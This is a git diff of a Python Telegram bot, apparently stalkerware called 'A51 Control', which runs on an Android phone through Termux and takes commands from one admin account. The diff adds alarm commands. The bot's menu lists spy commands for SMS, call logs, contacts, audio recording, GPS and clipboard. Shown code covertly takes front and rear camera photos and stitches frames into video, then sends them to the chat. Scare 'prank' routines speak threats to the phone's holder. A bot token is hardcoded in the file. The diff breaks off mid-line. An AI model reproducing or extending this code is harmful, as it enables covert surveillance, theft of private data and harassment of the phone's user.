@@ -1,6 +1,7 @@
 import telebot
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton, WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton
 import subprocess, os, json, time, signal, threading, random
+from datetime import datetime
 
 TOKEN = '8733717882:AAFyHqQpFBFVKLOgB6w1WRxqx7_DX9xxg6I'
 ADMIN_ID = 6678107119
@@ -9,6 +10,9 @@ PULT_URL = 'https://raw.githack.com/ggfix666-prog/a51-sc-control/main/prank.html
 bot = telebot.TeleBot(TOKEN)
 current_process = None
 PAUSED = False
+ALARM_VIBRATE = False
+ALARM_THREADS = {}  # {id: {"stop": False, ...}}
+ALARMS_FILE = '/sdcard/Download/alarms.json'
 
 def is_admin(m): return m.from_user.id == ADMIN_ID
 
@@ -25,39 +29,26 @@ def start(message):
     bot.reply_to(message,
         "🤖 <b>A51 Control</b>\n\n"
         "🎵 <b>МУЗЫКА</b>\n"
-        "/list — список треков\n"
-        "/play имя — играть\n"
-        "/stop — стоп\n"
-        "/volume 50 — громкость\n"
-        "/loud — громкость максимум\n\n"
+        "/list /play /stop /volume 50 /loud\n\n"
         "🔧 <b>СИСТЕМА</b>\n"
-        "/say текст — голос\n"
-        "/torch on|off — фонарик\n"
-        "/flash 5 — фонарик мигает N раз\n"
-        "/fakecall 15 — имитация звонка\n"
-        "/vibrate 5 — вибрация\n"
-        "/battery — батарея\n"
-        "/photo /selfie — фото\n"
-        "/burst 5 — серия фото задняя\n"
-        "/sburst 5 — серия фото фронт\n"
-        "/video 10 — «видео» задняя\n"
-        "/selfievideo 10 — «видео» фронт\n"
-        "/location — GPS\n"
-        "/clip — буфер\n"
-        "/brightness 50 — яркость\n"
-        "/notify текст — уведомление\n"
-        "/device — модель/Android\n"
-        "/silent — беззвучный\n"
-        "/open ссылка — открыть ссылку\n\n"
+        "/say /torch on|off /flash 5 /fakecall 15\n"
+        "/vibrate 5 /battery /photo /selfie\n"
+        "/burst 5 /sburst 5 /video 10 /selfievideo 10\n"
+        "/location /clip /brightness 50 /notify\n"
+        "/device /silent /open\n\n"
         "🕵️ <b>ШПИОН</b>\n"
-        "/sms /calls /contacts\n"
-        "/record 10 — запись\n"
+        "/sms /calls /contacts /record 10\n"
         "/wifi /wifiscan /toast\n\n"
         "🎭 <b>ПРАНК</b>\n"
         "/prank /ghost /insane\n\n"
+        "⏰ <b>БУДИЛЬНИКИ</b>\n"
+        "/alarm ЧЧ:ММ трек.mp3 10 — свой будильник\n"
+        "/alarms — список активных\n"
+        "/alarm_stop — остановить все\n"
+        "/alarm_vibrate on|off\n"
+        "/samsung_alarm ЧЧ:ММ — системный будильник\n\n"
         "⏻ <b>УПРАВЛЕНИЕ БОТОМ</b>\n"
-        "/botoff — выключить бота\n"
-        "/boton — включить бота\n\n"
+        "/botoff /boton\n\n"
         "Открой «🎮 Пульт» внизу 👇",
         parse_mode='HTML', reply_markup=prank_kb())
 
@@ -66,7 +57,7 @@ def start(message):
 def botoff_cmd(message):
     global PAUSED
     PAUSED = True
-    bot.reply_to(message, "💤 *Бот выключен.*\nВсе команды игнорируются.\nНапиши /boton чтобы включить.", parse_mode='Markdown')
+    bot.reply_to(message, "БОТ ПОЛНОСТЬЮ ВЫКЛЮЧЕН, НЕ РАБОТАЕТ")
 
 @bot.message_handler(commands=['boton'])
 def boton_cmd(message):
@@ -74,10 +65,9 @@ def boton_cmd(message):
     PAUSED = False
     bot.reply_to(message, "▶️ *Бот снова работает.*\nВсе команды активны.", parse_mode='Markdown')
 
-# Глушилка — ловит всё, если PAUSED=True (кроме /boton, /botoff, /start)
 @bot.message_handler(func=lambda m: PAUSED and m.text and not m.text.startswith('/boton') and not m.text.startswith('/botoff') and not m.text.startswith('/start'))
 def kill_all(message):
-    bot.reply_to(message, "🔒 Бот выключен.\nНапиши /boton чтобы включить.")
+    bot.reply_to(message, "БОТ ПОЛНОСТЬЮ ВЫКЛЮЧЕН, НЕ РАБОТАЕТ")
 
 # ── ФОНАРИК-МИГАНИЕ ──
 @bot.message_handler(commands=['flash'])
@@ -99,34 +89,28 @@ def flash_cmd(message):
         bot.send_message(message.chat.id, f"✅ Мигнул {n} раз")
     threading.Thread(target=_do, daemon=True).start()
 
-# ── ИМИТАЦИЯ ВХОДЯЩЕГО ЗВОНКА ──
+# ── ИМИТАЦИЯ ЗВОНКА ──
 @bot.message_handler(commands=['fakecall'])
 def fakecall_cmd(message):
     p = message.text.split()
     sec = int(p[1]) if len(p) > 1 and p[1].isdigit() else 15
     sec = min(sec, 120)
-    bot.reply_to(message, f"📞 Имитирую входящий звонок {sec} сек...")
+    bot.reply_to(message, f"📞 Имитирую звонок {sec} сек...")
     def _do():
         try:
             subprocess.run([
-                "termux-notification",
-                "--title", "☎️ Входящий вызов",
-                "--content", "Неизвестный номер",
-                "--sound",
-                "--priority", "max",
+                "termux-notification", "--title", "☎️ Входящий вызов",
+                "--content", "Неизвестный номер", "--sound", "--priority", "max",
                 "--id", "777",
-                "--button1", "Ответить",
-                "--button1-action", "termux-toast 'Ответил'",
-                "--button2", "Отклонить",
-                "--button2-action", "termux-notification-remove 777"
+                "--button1", "Ответить", "--button1-action", "termux-toast 'Ответил'",
+                "--button2", "Отклонить", "--button2-action", "termux-notification-remove 777"
             ], check=True)
             end_time = time.time() + sec
             while time.time() < end_time:
                 subprocess.run(["termux-vibrate", "-d", "2000"])
                 time.sleep(3)
         except Exception as e:
-            bot.send_message(message.chat.id, f"❌ {e}")
-            return
+            bot.send_message(message.chat.id, f"❌ {e}"); return
         subprocess.run(["termux-notification-remove", "777"])
         bot.send_message(message.chat.id, "✅ Звонок завершён")
     threading.Thread(target=_do, daemon=True).start()
@@ -137,9 +121,8 @@ def loud_cmd(message):
     bot.reply_to(message, "🔊 Громкость максимум...")
     try:
         subprocess.run(["termux-volume", "music", "15"], check=True)
-        bot.send_message(message.chat.id, "✅ Громкость на максимум (15/15)")
-    except Exception as e:
-        bot.reply_to(message, f"❌ {e}")
+        bot.send_message(message.chat.id, "✅ Громкость на максимум")
+    except Exception as e: bot.reply_to(message, f"❌ {e}")
 
 # ── МУЗЫКА ──
 MUSIC_DIR = '/sdcard/Music'
@@ -297,14 +280,11 @@ def open_cmd(message):
     if not u: bot.reply_to(message, "Напиши: /open https://..."); return
     try:
         subprocess.run([
-            "termux-notification",
-            "--title", "🌐 Открыть ссылку",
-            "--content", u[:100],
-            "--button1", "Открыть",
-            "--button1-action", f"termux-open '{u}'",
-            "--id", "99"
+            "termux-notification", "--title", "🌐 Открыть ссылку",
+            "--content", u[:100], "--button1", "Открыть",
+            "--button1-action", f"termux-open '{u}'", "--id", "99"
         ], check=True)
-        bot.reply_to(message, f"🔔 Потяни шторку и нажми «Открыть»")
+        bot.reply_to(message, "🔔 Потяни шторку и нажми «Открыть»")
     except Exception as e: bot.reply_to(message, f"Ошибка: {e}")
 
 # ── ШПИОН ──
@@ -366,7 +346,7 @@ def _record_video(message, cam_index, sec, label):
         try:
             os.makedirs(frames_dir, exist_ok=True)
             subprocess.run(f"rm -f {frames_dir}/*.jpg", shell=True)
-            bot.send_message(message.chat.id, f"📷 Снимаю кадры {sec} сек, подожди...")
+            bot.send_message(message.chat.id, f"📷 Снимаю кадры {sec} сек...")
             n = 0
             deadline = time.time() + sec
             while time.time() < deadline:
@@ -377,17 +357,17 @@ def _record_video(message, cam_index, sec, label):
             if n < 2:
                 bot.reply_to(message, "❌ Меньше 2 кадров."); return
             subprocess.run([
-                "ffmpeg", "-y", "-framerate", "2",
+                "ffmpeg","-y","-framerate","2",
                 "-i", f"{frames_dir}/f%04d.jpg",
-                "-c:v", "libx264", "-pix_fmt", "yuv420p",
-                "-vf", "scale=1280:-2", out_path
+                "-c:v","libx264","-pix_fmt","yuv420p",
+                "-vf","scale=1280:-2", out_path
             ], capture_output=True, timeout=120)
             if os.path.exists(out_path) and os.path.getsize(out_path) > 500:
-                with open(out_path, 'rb') as f:
+                with open(out_path,'rb') as f:
                     bot.send_video(message.chat.id, f, caption=f"{label} ({n} кадров)")
                 os.remove(out_path)
             else:
-                bot.reply_to(message, "❌ ffmpeg не склеил видео.")
+                bot.reply_to(message, "❌ ffmpeg не склеил.")
             subprocess.run(f"rm -rf {frames_dir}", shell=True)
         except Exception as e:
             bot.reply_to(message, f"❌ {e}")
@@ -398,7 +378,7 @@ def burst_cmd(message):
     p = message.text.split()
     n = int(p[1]) if len(p) > 1 and p[1].isdigit() else 5
     n = min(n, 20)
-    bot.reply_to(message, f"📸 Делаю {n} фото, жди...")
+    bot.reply_to(message, f"📸 {n} фото...")
     def _do():
         sent = 0
         for i in range(n):
@@ -406,12 +386,11 @@ def burst_cmd(message):
             try:
                 subprocess.run(["termux-camera-photo","-c","0",path], capture_output=True, timeout=10)
                 if os.path.exists(path):
-                    with open(path, 'rb') as f:
+                    with open(path,'rb') as f:
                         bot.send_photo(message.chat.id, f)
-                    os.remove(path)
-                    sent += 1
+                    os.remove(path); sent += 1
             except: pass
-        bot.send_message(message.chat.id, f"✅ Готово: {sent}/{n} фото")
+        bot.send_message(message.chat.id, f"✅ {sent}/{n}")
     threading.Thread(target=_do, daemon=True).start()
 
 @bot.message_handler(commands=['sburst'])
@@ -419,7 +398,7 @@ def sburst_cmd(message):
     p = message.text.split()
     n = int(p[1]) if len(p) > 1 and p[1].isdigit() else 5
     n = min(n, 20)
-    bot.reply_to(message, f"🤳 Селфи-burst {n} фото, жди...")
+    bot.reply_to(message, f"🤳 {n} селфи...")
     def _do():
         sent = 0
         for i in range(n):
@@ -427,27 +406,26 @@ def sburst_cmd(message):
             try:
                 subprocess.run(["termux-camera-photo","-c","1",path], capture_output=True, timeout=10)
                 if os.path.exists(path):
-                    with open(path, 'rb') as f:
+                    with open(path,'rb') as f:
                         bot.send_photo(message.chat.id, f)
-                    os.remove(path)
-                    sent += 1
+                    os.remove(path); sent += 1
             except: pass
-        bot.send_message(message.chat.id, f"✅ Готово: {sent}/{n} фото")
+        bot.send_message(message.chat.id, f"✅ {sent}/{n}")
     threading.Thread(target=_do, daemon=True).start()
 
 @bot.message_handler(commands=['video'])
 def video_cmd(message):
     p = message.text.split()
     sec = max(1, min(int(p[1]) if len(p)>1 and p[1].isdigit() else 10, 30))
-    bot.reply_to(message, f"🎥 Снимаю {sec} сек (задняя)...")
-    _record_video(message, 0, sec, "📹 Задняя камера")
+    bot.reply_to(message, f"🎥 {sec} сек (задняя)...")
+    _record_video(message, 0, sec, "📹 Задняя")
 
 @bot.message_handler(commands=['selfievideo'])
 def selfievideo_cmd(message):
     p = message.text.split()
     sec = max(1, min(int(p[1]) if len(p)>1 and p[1].isdigit() else 10, 30))
-    bot.reply_to(message, f"🤳 Снимаю {sec} сек (фронт)...")
-    _record_video(message, 1, sec, "🤳 Фронтальная камера")
+    bot.reply_to(message, f"🤳 {sec} сек (фронт)...")
+    _record_video(message, 1, sec, "🤳 Фронт")
 
 @bot.message_handler(commands=['wifi'])
 def wifi_cmd(message):
@@ -499,10 +477,8 @@ def ghost_cmd(message):
     try:
         subprocess.run(["termux-tts-speak","Я здесь. Я вижу тебя."])
         time.sleep(3)
-        subprocess.run(["termux-vibrate","-d","1000"])
-        time.sleep(1)
-        subprocess.run(["termux-toast","Не оборачивайся"])
-        time.sleep(2)
+        subprocess.run(["termux-vibrate","-d","1000"]); time.sleep(1)
+        subprocess.run(["termux-toast","Не оборачивайся"]); time.sleep(2)
         subprocess.run(["termux-torch","on"]); time.sleep(0.5)
         subprocess.run(["termux-torch","off"])
         bot.reply_to(message, "Ушёл.")
@@ -523,56 +499,147 @@ def insane_cmd(message):
     except Exception as e: bot.reply_to(message, f"Ошибка: {e}")
 
 # ═══════════════════════════════════════════
+#  БУДИЛЬНИК TERMUX
+# ═══════════════════════════════════════════
+def load_alarms():
+    if not os.path.exists(ALARMS_FILE): return []
+    try:
+        with open(ALARMS_FILE, 'r', encoding='utf-8') as f:
+            return json.load(f)
+    except: return []
+
+def save_alarms(alarms):
+    with open(ALARMS_FILE, 'w', encoding='utf-8') as f:
+        json.dump(alarms, f, ensure_ascii=False, indent=2)
+
+def alarm_worker(alarm_id, time_str, track, repeat, vibrate=False):
+    """Поток, который ждёт время и играет."""
+    while not ALARM_THREADS.get(alarm_id, {}).get('stop'):
+        now = datetime.now().strftime("%H:%M")
+        if now >= time_str:
+            break
+        time.sleep(10)
+    
+    if ALARM_THREADS.get(alarm_id, {}).get('stop'):
+        return
+    
+    subprocess.run(["termux-volume", "music", "15"])
+    
+    if vibrate:
+        try:
+            subprocess.Popen(["termux-vibrate", "-d", str(min(repeat, 60) * 30 * 1000)])
+        except: pass
+    
+    for i in range(repeat):
+        if ALARM_THREADS.get(alarm_id, {}).get('stop'):
+            break
+        p = os.path.join(MUSIC_DIR, track) if track else ""
+        if not track:
+            subprocess.run(["termux-tts-speak", "Будильник"])
+            break
+        if not os.path.exists(p) and os.path.exists(p + '.mp3'):
+            p += '.mp3'
+        if not os.path.exists(p):
+            subprocess.run(["termux-tts-speak", "Файл не найден"])
+            break
+        try:
+            subprocess.run(["mpv", "--no-video", "--really-quiet", p],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
+        except: pass
+        time.sleep(3)
+    
+    ALARM_THREADS.pop(alarm_id, None)
+
+@bot.message_handler(commands=['alarm'])
+def alarm_cmd(message):
+    parts = message.text.split(maxsplit=3)
+    if len(parts) < 2:
+        bot.reply_to(message, "Формат: /alarm 07:00 трек.mp3 10")
+        return
+    time_str = parts[1]
+    if not (len(time_str) == 5 and time_str[2] == ':'):
+        bot.reply_to(message, "❌ Время в формате ЧЧ:ММ")
+        return
+    track = parts[2] if len(parts) > 2 else ""
+    try:
+        repeat = int(parts[3]) if len(parts) > 3 and parts[3].isdigit() else 10
+    except: repeat = 10
+    repeat = max(1, min(repeat, 100))
+    
+    alarm_id = str(int(time.time()))
+    ALARM_THREADS[alarm_id] = {"stop": False}
+    t = threading.Thread(target=alarm_worker,
+        args=(alarm_id, time_str, track, repeat, ALARM_VIBRATE), daemon=True)
+    t.start()
+    
+    alarms = load_alarms()
+    alarms.append({"id": alarm_id, "time": time_str, "track": track, "repeat": repeat})
+    save_alarms(alarms)
+    
+    bot.reply_to(message, f"⏰ Будильник на {time_str}\n🎵 {track or 'TTS'}\n🔁 {repeat} раз")
+
+@bot.message_handler(commands=['alarms'])
+def alarms_list_cmd(message):
+    alarms = load_alarms()
+    if not alarms:
+        bot.reply_to(message, "📭 Нет активных будильников."); return
+    t = "⏰ Активные будильники:\n\n"
+    for a in alarms:
+        t += f"🕐 {a['time']} — {a.get('track','TTS')}\n🔁 {a.get('repeat',10)} раз\n\n"
+    bot.reply_to(message, t)
+
+@bot.message_handler(commands=['alarm_stop'])
+def alarm_stop_cmd(message):
+    for aid, data in list(ALARM_THREADS.items()):
+        data['stop'] = True
+    ALARM_THREADS.clear()
+    subprocess.run(["pkill", "-9", "mpv"], stderr=subprocess.DEVNULL)
+    save_alarms([])
+    bot.reply_to(message, "⏹ Все будильники остановлены.")
+
+@bot.message_handler(commands=['alarm_vibrate'])
+def alarm_vibrate_cmd(message):
+    p = message.text.split()
+    if len(p) < 2 or p[1].lower() not in ['on','off']:
+        bot.reply_to(message, "Формат: /alarm_vibrate on|off"); return
+    global ALARM_VIBRATE
+    ALARM_VIBRATE = p[1].lower() == 'on'
+    bot.reply_to(message, f"📳 Вибрация: {p[1].upper()}")
+
+# ═══════════════════════════════════════════
+#  БУДИЛЬНИК SAMSUNG
+# ═══════════════════════════════════════════
+@bot.message_handler(commands=['samsung_alarm'])
+def samsung_alarm_cmd(message):
+    p = message.text.split()
+    if len(p) < 2:
+        bot.reply_to(message, "Формат: /samsung_alarm 07:00"); return
+    time_str = p[1]
+    try:
+        h, m = time_str.split(':'); h, m = int(h), int(m)
+        if h < 0 or h > 23 or m < 0 or m > 59: raise ValueError()
+    except:
+        bot.reply_to(message, "❌ Формат ЧЧ:ММ (00:00 — 23:59)"); return
+    
+    try:
+        subprocess.run([
+            "am", "start",
+            "-a", "android.intent.action.SET_ALARM",
+            "--ei", "android.intent.extra.alarm.HOUR", str(h),
+            "--ei", "android.intent.extra.alarm.MINUTES", str(m),
+            "--ez", "android.intent.extra.alarm.SKIP_UI", "false"
+        ], check=True)
+        bot.reply_to(message, f"📱 Открыл будильник Samsung на {time_str}\nНажми «Сохранить».")
+    except Exception as e:
+        bot.reply_to(message, f"❌ {e}")
+
+# ═══════════════════════════════════════════
 #  ОБРАБОТЧИК WEB APP
 # ═══════════════════════════════════════════
 @bot.message_handler(content_types=['web_app_data'])
 def handle_webapp(message):
     raw = message.web_app_data.data.strip()
     print(f"[WEBAPP] {raw[:80]}")
-    fake = message
-    fake.text = raw
     cmd = raw.split()[0] if raw else ""
-    try:
-        if cmd == '/torch': torch_cmd(fake)
-        elif cmd == '/say': say_cmd(fake)
-        elif cmd == '/vibrate': vibrate_cmd(fake)
-        elif cmd == '/battery': battery_cmd(fake)
-        elif cmd == '/photo': photo_cmd(fake)
-        elif cmd == '/selfie': selfie_cmd(fake)
-        elif cmd == '/location': loc_cmd(fake)
-        elif cmd == '/clip': clip_cmd(fake)
-        elif cmd == '/brightness': bright_cmd(fake)
-        elif cmd == '/notify': notify_cmd(fake)
-        elif cmd == '/device': device_cmd(fake)
-        elif cmd == '/silent': silent_cmd(fake)
-        elif cmd == '/open': open_cmd(fake)
-        elif cmd == '/sms': sms_cmd(fake)
-        elif cmd == '/calls': calls_cmd(fake)
-        elif cmd == '/contacts': contacts_cmd(fake)
-        elif cmd == '/record': record_cmd(fake)
-        elif cmd == '/wifi': wifi_cmd(fake)
-        elif cmd == '/wifiscan': wifiscan_cmd(fake)
-        elif cmd == '/toast': toast_cmd(fake)
-        elif cmd == '/prank': prank_cmd(fake)
-        elif cmd == '/ghost': ghost_cmd(fake)
-        elif cmd == '/insane': insane_cmd(fake)
-        elif cmd == '/list': list_cmd(fake)
-        elif cmd == '/play': play_cmd(fake)
-        elif cmd == '/stop': stop_cmd(fake)
-        elif cmd == '/volume': vol_cmd(fake)
-        elif cmd == '/burst': burst_cmd(fake)
-        elif cmd == '/sburst': sburst_cmd(fake)
-        elif cmd == '/video': video_cmd(fake)
-        elif cmd == '/selfievideo': selfievideo_cmd(fake)
-        elif cmd == '/flash': flash_cmd(fake)
-        elif cmd == '/fakecall': fakecall_cmd(fake)
-        elif cmd == '/loud': loud_cmd(fake)
-        elif cmd == '/botoff': botoff_cmd(fake)
-        elif cmd == '/boton': boton_cmd(fake)
-        else: bot.send_message(message.chat.id, f"❓ {raw[:40]}")
-    except Exception as e:
-        print(f"[WEBAPP] ERROR: {e}")
-        bot.send_message(message.chat.id, f"❌ {e}")
-
-print("A51 Control Bot запущен...")
-bot.polling(none_stop=True)
+    if PAUSED and cmd not in ['/boton', '/botoff', '/start']:
+        bot
